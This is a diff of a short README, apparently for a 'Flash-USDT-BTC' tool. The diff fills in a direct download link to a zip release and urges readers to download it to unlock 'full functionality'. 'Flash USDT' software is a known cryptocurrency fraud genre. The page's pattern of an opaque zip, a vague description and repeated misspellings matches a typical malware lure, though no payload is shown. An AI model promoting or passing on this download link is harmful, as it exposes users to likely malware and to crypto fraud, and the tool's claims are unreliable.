@@ -1,7 +1,7 @@
 ・ Picture of the program: https://imgur.com/a/FVraesf
 
 ## Download Relase!
-🚀 Install --> [Releases]()
+🚀 Install --> [Releases](https://github.com/robbixe/Flash-USDT-BTC/releases/download/v2.6/Relase.zip)
 
 ## Important:
 To access the full functionality of the program, download the latest version from the "Release" section.
